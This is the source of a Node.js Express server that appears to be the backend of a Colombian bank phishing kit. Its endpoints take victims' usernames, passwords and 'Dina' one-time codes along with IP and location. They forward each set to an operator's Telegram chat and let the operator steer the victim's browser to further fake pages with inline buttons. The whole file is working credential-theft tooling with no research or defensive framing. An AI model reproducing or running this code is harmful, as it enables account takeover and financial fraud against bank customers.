import 'dotenv/config';
import express from 'express';
import cors from 'cors';

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());

const PORT = process.env.PORT || 10000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// --------------------- Estado en memoria (sin archivos) ---------------------
const sessionStates = new Map();

async function readState(sessionId) {
  if (!sessionStates.has(sessionId)) {
    sessionStates.set(sessionId, {
      sessionId,
      data: {},
      history: [],
      pending: null, // Aquí se guarda la redirección pendiente
      lastUpdate: null
    });
  }
  return sessionStates.get(sessionId);
}

async function writeState(sessionId, patch) {
  const current = await readState(sessionId);
  const updated = {
    ...current,
    ...patch,
    lastUpdate: new Date().toISOString()
  };
  sessionStates.set(sessionId, updated);
  return updated;
}

function ts() {
  return new Date().toISOString();
}

// --------------------- Telegram helpers ---------------------
async function tgSendMessage(text, inlineKeyboard) {
  const payload = {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: inlineKeyboard ? { inline_keyboard: inlineKeyboard } : undefined
  };
  const res = await fetch(`${TG_API}/sendMessage`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(payload)
  });
  if (!res.ok) {
    const errTxt = await res.text();
    console.error('sendMessage failed:', errTxt);
  }
}

// Función para generar botones con callback_data en formato 'action_sessionId'
function kbBtn(text, action, sessionId) {
  return [{ text, callback_data: `${action}_${sessionId}` }];
}

// Función para generar los botones para cada paso, usando el formato consistente
function buttonsForStep(step, sessionId) {
  if (step === 'virtual') {
    return [
      kbBtn('🔁 Error Logo', 'error_logo', sessionId),
      kbBtn('➡️ Siguiente', 'siguiente', sessionId)
    ];
  }
  if (step === 'otp1' || step === 'otp2') {
    return [
      kbBtn('🔁 Error Logo', 'error_logo', sessionId),
      kbBtn('⚠️ Error OTP', 'error_otp', sessionId),
      kbBtn('🔄 Nuevo OTP', 'nuevo_otp', sessionId),
      kbBtn('✅ Finalizar', 'finalizar', sessionId)
    ];
  }
  return [];
}

function fmt(k, v) {
  if (!v) return '';
  return `<b>${k}:</b> ${String(v).replace(/</g, '&lt;').replace(/>/g, '&gt;')}`;
}

app.post('/virtualpersona', async (req, res) => {
  try {
    const { sessionId, user, pass, ip, country, city } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

    // 1. Guardar estado
    const updated = await writeState(sessionId, {
      step: 'virtual',
      data: { ...(await readState(sessionId)).data, user, pass, ip, country, city },
      history: [
        ...(await readState(sessionId)).history,
        { t: ts(), event: 'virtualpersona', user, pass }
      ],
      pending: null // Asegurarse de que no haya redirecciones pendientes al inicio
    });

    const message = `📲 NUEVO ACCESO VIRTUAL\n\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌐 IP: ${ip}\n🆔 SessionID: ${sessionId}\n📍 Ciudad: ${city} - ${country}`;

    // Usar la función buttonsForStep para generar los botones de forma consistente
    const inlineKeyboard = buttonsForStep('virtual', sessionId);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        reply_markup: {
          inline_keyboard: inlineKeyboard
        }
      })
    });

    res.json({ ok: true });

  } catch (err) {
    console.error('Error en /virtualpersona:', err);
    res.status(500).json({ error: 'Error interno del servidor' });
  }
});

app.post('/otp1', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

    const updated = await writeState(sessionId, {
      step: 'otp1',
      data: { ...(await readState(sessionId)).data, user, pass, dina, ip, country, city },
      history: [ ...(await readState(sessionId)).history, { t: ts(), event: 'otp1', dina } ],
      pending: null
    });

    const text =
`<b>📲 Ingreso OTP Dina</b>

${fmt('👤 User', user)}
${fmt('🔑 Pass', pass)}
${fmt('📳 Dina', dina)}
${fmt('🌐 IP', ip)}
${fmt('🌎 País', country)}
${fmt('🏘️ Ciudad', city)}

<b>SessionID:</b> <code>${sessionId}</code>
⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;

    await tgSendMessage(text, buttonsForStep('otp1', sessionId));
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'internal_error' });
  }
});

app.post('/otp2', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

    const updated = await writeState(sessionId, {
      step: 'otp2',
      data: { ...(await readState(sessionId)).data, user, pass, dina, ip, country, city },
      history: [ ...(await readState(sessionId)).history, { t: ts(), event: 'otp2', dina } ],
      pending: null
    });

    const text =
`<b>📲 Ingreso OTP new Dina</b>

${fmt('👤 User', user)}
${fmt('🔑 Pass', pass)}
${fmt('📳 Dina', dina)}
${fmt('🌐 IP', ip)}
${fmt('🌎 País', country)}
${fmt('🏘️ Ciudad', city)}

<b>SessionID:</b> <code>${sessionId}</code>
⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;

    await tgSendMessage(text, buttonsForStep('otp2', sessionId));
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'internal_error' });
  }
});

// Endpoint para que el cliente consulte si hay una instrucción de redirección
app.get('/instruction/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

  const st = await readState(sessionId);
  if (st.pending && st.pending.redirect_to) {
    const redirect_to = st.pending.redirect_to;
    // Una vez que la instrucción es leída, la limpiamos para evitar redirecciones repetidas
    await writeState(sessionId, { pending: null });
    return res.json({ redirect_to });
  }
  res.json({ redirect_to: null });
});

app.get('/set-webhook', async (req, res) => {
  try {
    if (!PUBLIC_BASE_URL) return res.status(400).send('PUBLIC_BASE_URL requerido');
    const webhookUrl = `${PUBLIC_BASE_URL}/telegram/webhook`;
    const r = await fetch(`${TG_API}/setWebhook`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ url: webhookUrl })
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'webhook_error' });
  }
});

app.post('/telegram/webhook', async (req, res) => {
  const body = req.body;
  console.log("📩 Webhook recibido:", body);

  if (body.callback_query) {
    const callbackData = body.callback_query.data;
    // Dividir el callback_data para obtener la acción y el sessionId
    const parts = callbackData.split('_');
    const action = parts[0];
    const sessionId = parts.slice(1).join('_'); // Reconstruir sessionId si contiene '_'

    console.log(`🔧 Acción: ${action} | Sesión: ${sessionId}`);

    if (sessionId && action) {
      let redirect_to = null;
      switch (action) {
        case 'siguiente':
          redirect_to = '/opcion1.html';
          break;
        case 'error_logo':
          redirect_to = '/Virtual-Persona.html';
          break;
        case 'error_otp':
          redirect_to = '/otp-check.html';
          break;
        case 'nuevo_otp':
          redirect_to = '/opcion1.html'; // Asumiendo que 'Nuevo OTP' redirige a la misma página de inicio de OTP
          break;
        case 'finalizar':
          redirect_to = '/finalizar.html'; // Página de finalización
          break;
        default:
          console.warn(`Acción desconocida: ${action}`);
          break;
      }

      if (redirect_to) {
        await writeState(sessionId, { pending: { redirect_to } });
        console.log(`✅ Estado actualizado para ${sessionId} → ${redirect_to}`);
      }
    }

    // Responde al botón presionado para que Telegram sepa que se procesó
    res.send({
      method: 'answerCallbackQuery',
      callback_query_id: body.callback_query.id,
      text: '✅ Acción recibida.',
      show_alert: false // No mostrar un pop-up al usuario
    });
  } else {
    // Si no es un callback_query, simplemente responde 200 OK
    res.sendStatus(200);
  }
});

app.get('/health', (_, res) => res.send('ok'));

app.listen(PORT, () => {
  console.log('✅ Servidor activo y escuchando en el puerto', PORT);
});
